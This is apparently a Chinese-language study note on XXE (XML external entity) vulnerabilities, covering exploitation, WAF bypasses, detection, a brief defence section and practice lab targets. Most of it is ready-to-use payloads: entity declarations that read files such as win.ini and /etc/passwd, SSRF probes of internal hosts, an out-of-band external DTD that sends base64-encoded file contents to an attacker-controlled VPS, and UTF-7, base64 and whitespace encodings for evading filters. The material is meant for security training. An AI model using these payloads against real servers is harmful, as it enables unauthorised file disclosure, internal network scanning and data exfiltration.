
###  一、xml簡介
一种存储和传输数据的标签语言。xml不适用预定义的标签，因此可以为标记指定描述数据的名称
文档结构：
	xml文档声明，在文档第一行
	xml文档类型定义
	xml文档元素
dtd文档类型定义：（漏洞产生在文档类型定义处，外部声明dtd处）
	![[Pasted image 20231221090308.png]]

### 二、xxe漏洞基础：
 ![[Pasted image 20231221090530.png]]
### 三、xxe漏洞利用：
#### 1、有回显利用：
##### 读取文件：
```xml
<?xml version= "1.0" encoding= "utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY aaa SYSTEM "php://filter/convert.base64-encode/resource=xxe_1.php" >]>
<name>&aaa;</name>



<!ENTITY aaa SYSTEM "php://filter/convert.base64-encode/resource=xxe_1.php" >]>
<!ENTITY aaa SYSTEM "file:///C:/Windows/win.ini" >]>
```
	![[Pasted image 20231221091455.png]]
##### 内网探测：
bp爆破ip的d字段可以探测内网可用主机，bp爆破端口可以探测内网主机开启的端口
```xml
<?xml version= "1.0" encoding= "utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]>
<name>&xxe;</name>
```
	![[Pasted image 20231221091721.png]]

##### 引入外部实体dtd：
```XML
<!--payload-->
<?xml version= "1.0"?>
<!DOCTYPE test[
<!ENTITY % dtd SYSTEM "http://192.168.43.117/eval.dtd">
%dtd;
]>
<name>&send;</name>

<!--eval.dtd-->
<!ENTITY send SYSTEM "file:///C:/windows/win.ini">

在192.168.43.117这台vps上的eval.dtd所在目录开启http服务
python -m http.server 80
```
	![[Pasted image 20231221092209.png]]
	![[Pasted image 20231221092252.png]]



#### 2、无回显利用：
##### 加载外部dtd
```xml
test.dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=C:/windows/win.ini"><!--读取文件存放到file中-->
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://192.168.43.117:8080/?abc=%file;'>"> %payload;<!--将文件作为参数发送请求到我们自己的vps中，最终的数据会存放到我们的访问日志中-->

payload
<?xml version= "1.0"?>
<!DOCTYPE test[
<!ENTITY % dtd SYSTEM "http://192.168.43.117:8080/xxe/test.dtd">
%dtd;
%send;
]>
```
![[Pasted image 20231221101242.png]]
##### 加载外部xml

![[Pasted image 20231221101755.png]]





### 四、xxe漏洞探测
白盒：
simplexml_load_string()函数
黑盒：
1、看content-type类型：是否为application/xml
2、看数据提交格式：抓包看提交数据格式是否类似标签格式
3、contenttype和格式都不是，并且你确定有xxe，就可以改contenttype类型
![[Pasted image 20231221102131.png]]
### 五、xxe-绕过
#### 1、utf-7编码
```
UTF-7编码：

<?xml version= "1.0" encoding= "UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
#### 2、base64编码
```
<!DOCTYPE test [ <!ENTITY % init SYSTEM

"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
#### 3、空格绕过
通常XXE漏洞存在于XML文档的开头，有的WAF会检测XML文档中开头中的某些子字
符串或正则表达式，但是XML格式在设置标签属性的格式时允许使用任何数量的空格，
因此我们可以在<?xml?>或<!DOCTYPE>中插入数量足够多的空格去绕过WAF的检测。
```
<?xml                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
version= "1.0" encoding= "utf-8"?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert-base64.encode/resource=/flag.txt">
<!ENTITY % remote SYSTEM "http://vps-ip/test.dtd">
%remote;
%dtd;
%xxe;
]>
```

### 六、防御
#### 1、使用开放语言禁用xxe
```php
libxml_disable_entity_loader(true);
```
#### 2、过滤
过滤<!DOCTYPE>, <!ENTITY>, SYSTEM，file://,http:// 等
### 七、练习
```
练习：
1. 无回显利用，pikachu
http://172.168.20.210:84/vul/xxe/xxe_1.php  
2. xxe探测：
黑盒：
    http://172.168.20.210:85/
    http://web.jarvisoj.com:9882/
白盒：
    http://172.168.20.210:8130/
拿shell:
    http://172.168.20.250/(xxe+Struts2漏洞)
```